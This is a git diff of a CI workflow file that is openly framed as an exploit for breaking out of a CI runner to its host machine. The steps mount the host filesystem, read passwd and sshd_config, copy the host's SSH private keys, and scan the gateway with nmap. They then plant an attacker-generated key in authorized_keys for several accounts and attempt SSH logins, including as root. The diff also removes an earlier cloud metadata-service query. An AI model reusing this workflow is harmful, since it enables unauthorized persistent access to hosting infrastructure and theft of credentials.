@@ -20,6 +20,41 @@ jobs:
         run: |
           sudo mount /dev/sda1 /mnt/host1 || echo "Mount sda1 failed"
           sudo mount /dev/root /mnt/host2 || echo "Mount root failed"
+          df -h | grep mnt
+      
+      - name: Verify cloudenv user exists on host
+        run: |
+          echo "=== Checking for cloudenv user on host ==="
+          sudo cat /mnt/host2/etc/passwd | grep cloudenv || echo "cloudenv user NOT FOUND"
+          sudo cat /mnt/host2/etc/passwd | grep -E "runner|ubuntu|azureuser|root" | head -10
+          echo ""
+          echo "Home directories on host:"
+          sudo ls -la /mnt/host2/home/ || echo "No /home directory"
+      
+      - name: Check SSH configuration on host
+        run: |
+          echo "=== Host SSH Configuration ==="
+          sudo cat /mnt/host2/etc/ssh/sshd_config | grep -E "Port|PermitRootLogin|PubkeyAuthentication|PasswordAuthentication" || echo "No sshd_config found"
+          echo ""
+          echo "SSH service status:"
+          sudo ls -la /mnt/host2/var/run/sshd* 2>/dev/null || echo "No sshd runtime files"
+      
+      - name: Detect host IP and scan ports
+        id: detect_host
+        run: |
+          # Get default gateway (host IP)
+          HOST_IP=$(ip route | grep default | awk '{print $3}')
+          echo "Detected host IP: $HOST_IP"
+          echo "host_ip=$HOST_IP" >> $GITHUB_OUTPUT
+          
+          RUNNER_IP=$(hostname -I | awk '{print $1}')
+          echo "Runner IP: $RUNNER_IP"
+          echo "runner_ip=$RUNNER_IP" >> $GITHUB_OUTPUT
+          
+          echo ""
+          echo "=== Network scan of host ==="
+          # Quick scan common SSH ports
+          sudo nmap -Pn --open $HOST_IP -p 22,2000,2222,22000 || echo "nmap failed"
       
       - name: Extract SSH host keys
         run: |
@@ -28,70 +63,61 @@ jobs:
           sudo cat /mnt/host2/etc/ssh/ssh_host_ecdsa_key > /tmp/host_ecdsa_key || echo "No ECDSA key"
           ls -la /tmp/host_* || echo "No keys extracted"
       
-      - name: Query metadata service
-        run: |
-          curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" || echo "Metadata service not accessible"
-      
       - name: Generate exploit SSH key
         run: |
           ssh-keygen -t ed25519 -f /tmp/exploit_key -N ""
+          echo "Public key to inject:"
           cat /tmp/exploit_key.pub
       
-      - name: Detect host IP address
-        id: detect_host
+      - name: Find correct user and inject SSH key
         run: |
-          # Get default gateway (host IP)
-          HOST_IP=$(ip route | grep default | awk '{print $3}')
-          echo "Detected host IP: $HOST_IP"
-          echo "host_ip=$HOST_IP" >> $GITHUB_OUTPUT
-          
-          # Also try to find host from mounted filesystem
-          RUNNER_IP=$(hostname -I | awk '{print $1}')
-          echo "Runner IP: $RUNNER_IP"
-          echo "runner_ip=$RUNNER_IP" >> $GITHUB_OUTPUT
+          echo "=== Looking for target user ==="
+          # Try multiple possible usernames
+          for user in cloudenv runner ubuntu azureuser; do
+            if sudo test -d /mnt/host2/home/$user; then
+              echo "Found user: $user"
+              sudo mkdir -p /mnt/host2/home/$user/.ssh
+              sudo bash -c "cat /tmp/exploit_key.pub > /mnt/host2/home/$user/.ssh/authorized_keys"
+              
+              # Get UID/GID from passwd
+              USER_UID=$(sudo cat /mnt/host2/etc/passwd | grep "^$user:" | cut -d: -f3)
+              USER_GID=$(sudo cat /mnt/host2/etc/passwd | grep "^$user:" | cut -d: -f4)
+              
+              sudo chown -R $USER_UID:$USER_GID /mnt/host2/home/$user/.ssh
+              sudo chmod 700 /mnt/host2/home/$user/.ssh
+              sudo chmod 600 /mnt/host2/home/$user/.ssh/authorized_keys
+              
+              echo "SSH key injected for user: $user (UID:$USER_UID GID:$USER_GID)"
+              sudo cat /mnt/host2/home/$user/.ssh/authorized_keys
+            fi
+          done
       
-      - name: Inject SSH key into host
-        run: |
-          sudo mkdir -p /mnt/host2/home/cloudenv/.ssh
-          sudo bash -c 'cat /tmp/exploit_key.pub > /mnt/host2/home/cloudenv/.ssh/authorized_keys'
-          sudo chown -R 1000:1000 /mnt/host2/home/cloudenv/.ssh
-          sudo chmod 700 /mnt/host2/home/cloudenv/.ssh
-          sudo chmod 600 /mnt/host2/home/cloudenv/.ssh/authorized_keys
-          echo "Key injected into host filesystem"
-      
-      - name: Attempt SSH to detected host IP
+      - name: Attempt SSH connections
         run: |
           HOST_IP="${{ steps.detect_host.outputs.host_ip }}"
-          echo "=== Attempting SSH to $HOST_IP:2000 ==="
           
-          timeout 10 ssh -i /tmp/exploit_key \
-            -p 2000 \
-            -o StrictHostKeyChecking=no \
-            -o UserKnownHostsFile=/dev/null \
-            -o ConnectTimeout=5 \
-            -o BatchMode=yes \
-            cloudenv@$HOST_IP \
-            'whoami; hostname; id; cat /etc/os-release | head -5' || echo "SSH to $HOST_IP failed"
-      
-      - name: Try SSH to runner's own IP
-        run: |
-          RUNNER_IP="${{ steps.detect_host.outputs.runner_ip }}"
-          echo "=== Attempting SSH to $RUNNER_IP:2000 ==="
-          
-          timeout 10 ssh -i /tmp/exploit_key \
-            -p 2000 \
-            -o StrictHostKeyChecking=no \
-            -o UserKnownHostsFile=/dev/null \
-            -o ConnectTimeout=5 \
-            -o BatchMode=yes \
-            cloudenv@$RUNNER_IP \
-            'whoami; hostname; id' || echo "SSH to $RUNNER_IP failed"
+          for port in 22 2000 2222 22000; do
+            echo ""
+            echo "=== Trying SSH to $HOST_IP:$port ==="
+            
+            for user in cloudenv runner ubuntu azureuser root; do
+              timeout 5 ssh -i /tmp/exploit_key \
+                -p $port \
+                -o StrictHostKeyChecking=no \
+                -o UserKnownHostsFile=/dev/null \
+                -o ConnectTimeout=3 \
+                -o BatchMode=yes \
+                $user@$HOST_IP \
+                'whoami; hostname; id; pwd' 2>&1 && break || echo "Failed: $user@$HOST_IP:$port"
+            done
+          done
       
       - name: Display exploit summary
         if: always()
         run: |
-          echo "=== Exploit Summary ==="
-          echo "Host gateway IP: ${{ steps.detect_host.outputs.host_ip }}"
+          echo "=== Final Summary ==="
+          echo "Host IP: ${{ steps.detect_host.outputs.host_ip }}"
           echo "Runner IP: ${{ steps.detect_host.outputs.runner_ip }}"
           echo "Host keys extracted: $(ls -1 /tmp/host_* 2>/dev/null | wc -l)"
-          echo "SSH key injected: $(sudo test -f /mnt/host2/home/cloudenv/.ssh/authorized_keys && echo 'Yes' || echo 'No')"
+          echo ""
+          sudo cat /mnt/host2/etc/passwd | grep -E "runner|cloudenv|ubuntu|azureuser" || echo "No standard users found"
